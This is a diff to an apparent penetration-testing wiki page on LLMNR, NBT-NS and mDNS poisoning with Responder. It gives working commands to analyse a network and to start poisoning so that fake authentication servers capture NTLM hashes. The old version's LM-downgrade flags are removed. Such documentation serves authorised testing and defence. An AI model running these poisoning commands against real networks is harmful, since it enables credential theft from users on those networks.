@@ -12,16 +12,16 @@ Attackers can then answer those multicast or broadcast queries. The victims are 
 
 {% tabs %}
 {% tab title="Responder" %}
-Analyze the network to see if LLMNR, NBT-NS and mDNS are used.
+Analyze the network to see if LLMNR, NBT-NS and DNS are used, and to inspect BROWSER requests.
 
 ```bash
 responder --interface eth0 --analyze
 ```
 
-Start poisoning, enable answers for netbios wredir and domain suffix queries, and force LM hashing downgrade.
+Start LLMNR, NBTS and mDNS poisoning. Fake authentication servers \(HTTP/S, SMB, SQL, FTP, IMAP, POP3, DNS, LDAP, ...\) will capture NTLM hashes.
 
 ```bash
-responder --interface eth0 --wredir --NBTNSdomain --lm
+responder --interface eth0
 ```
 {% endtab %}
 
